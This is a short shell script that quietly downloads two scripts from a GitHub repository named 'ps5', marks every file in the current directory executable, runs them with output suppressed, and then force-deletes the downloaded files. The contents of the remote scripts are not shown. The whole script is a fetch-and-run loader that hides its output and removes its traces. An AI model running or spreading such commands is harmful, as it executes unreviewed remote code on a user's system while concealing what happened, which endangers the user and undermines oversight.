wget -q https://raw.githubusercontent.com/no107yes990/ps5/refs/heads/main/one.sh >/dev/null 2>&1
wget -q https://raw.githubusercontent.com/no107yes990/ps5/refs/heads/main/two.sh >/dev/null 2>&1
chmod +x * && ./one.sh >/dev/null 2>&1
./two.sh
rm -rvf one.sh two.sh
